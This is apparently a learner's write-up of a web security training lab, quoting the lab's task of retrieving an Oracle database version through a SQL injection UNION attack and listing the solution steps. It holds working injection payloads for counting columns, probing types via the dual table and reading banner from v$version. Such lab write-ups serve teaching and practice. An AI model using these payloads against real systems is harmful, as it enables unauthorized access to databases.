This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string. 

Hint:
On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.

There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual

For more information, see our SQL injection cheat sheet.

End Goal:
- display the database version string

Analysis:
---------

1) Determine the number of columns 
' order by 3-- => internal server error

3-1 = 2

2) Determine the data types of the columns

' UNION SELECT 'a', 'a' from DUAL-- => Orcale Database

3) Output the version if the database

' UNION SELECT banner, NULL from v$version--
